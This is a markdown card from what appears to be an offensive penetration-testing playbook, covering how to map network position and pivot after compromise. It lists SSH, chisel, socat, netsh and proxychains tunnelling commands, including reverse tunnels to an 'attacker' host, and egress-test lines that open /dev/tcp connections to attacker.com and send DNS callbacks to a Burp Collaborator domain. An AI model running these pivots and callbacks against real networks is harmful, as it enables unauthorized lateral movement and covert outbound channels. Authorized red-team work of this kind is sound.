# Identity, Credential, Trust, And Network Capability: Model Network Position

> Apply [../module-continuity.md](../module-continuity.md). Inherit the engagement, parent path, current capability, evidence, authorization profile, and module stack. Do not initialize a separate workflow. Checkpoint material results and return them to the parent path before leaving this card.

## Model Network Position

Record interfaces, routes, DNS, proxies, tunnels, egress, reachable services, segmentation boundaries, protocol constraints, and which identity is used at each hop.

A network position change is one of the highest-value events in an engagement. Every pivot must trigger recollect.

### Tunnel / Pivot Patterns

| Scenario | Tool | Command | When to Use |
|---|---|---|---|
| **SSH dynamic forward** (SOCKS proxy) | SSH | `ssh -D 1080 -N user@pivot_host` | Linux pivot with SSH access |
| **SSH local forward** (single port) | SSH | `ssh -L 8080:internal:80 user@pivot_host` | Access a single internal service |
| **SSH reverse forward** (reverse tunnel) | SSH | `ssh -R 4444:localhost:22 user@attacker` | Pivot host connects back to you (egress from target) |
| **Chisel** (TCP tunnel over HTTP) | chisel | Server: `chisel server -p 8080 --reverse`, Client: `chisel client attacker:8080 R:socks` | Egress-restricted targets, WebSocket-based |
| **Ligolo-ng** (TUN interface tunnel) | ligolo-ng | Create TUN interface for full Layer 3 routing | Need full network access from pivot |
| **Socat** (port forward, relay) | socat | `socat TCP-LISTEN:8080,fork TCP:internal:80` | Simple port forwarding on compromised Linux host |
| **netsh portproxy** (Windows native) | netsh | `netsh interface portproxy add v4tov4 listenport=8080 connectaddress=internal connectport=80` | Simple port forwarding on compromised Windows host (no external tool needed) |
| **Proxychains** (torify-like for SOCKS) | proxychains | `proxychains nmap -sT -Pn internal_host` | TCP-only tools through SOCKS proxy |
| **Proxifier** (Windows, GUI) | Proxifier | Per-app proxy configuration | Windows GUI, complex routing rules |

**Pivot selection logic**:
- For interactive use (browser, Burp): SOCKS proxy (SSH -D, chisel)
- For nmap scanning: proxychains + TCP connect scan (-sT, not -sS — SYN scan doesn't work over SOCKS)
- For Windows tools that don't support proxy: ligolo-ng (TUN interface) or port forwarding
- For egress-restricted targets: reverse tunnel or beacon-style callback (chisel in reverse mode, C2 framework)

### Egress Testing

After landing on a new position, test what the host can reach:

```bash
# Test general internet access
curl -s -o /dev/null -w "%{http_code}" http://httpbin.org/ip
curl -s -o /dev/null -w "%{http_code}" https://httpbin.org/ip

# Test specific protocols
timeout 3 bash -c "echo > /dev/tcp/attacker.com/443" 2>/dev/null && echo "TCP/443: OPEN" || echo "TCP/443: BLOCKED"
timeout 3 bash -c "echo > /dev/tcp/attacker.com/8080" 2>/dev/null && echo "TCP/8080: OPEN" || echo "TCP/8080: BLOCKED"

# DNS egress (often allowed even when everything else is blocked)
nslookup uniqueid.burpcollaborator.net
dig +short uniqueid.burpcollaborator.net

# ICMP egress
ping -c 1 -W 3 attacker.com && echo "ICMP: OPEN" || echo "ICMP: BLOCKED"
```

---


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).
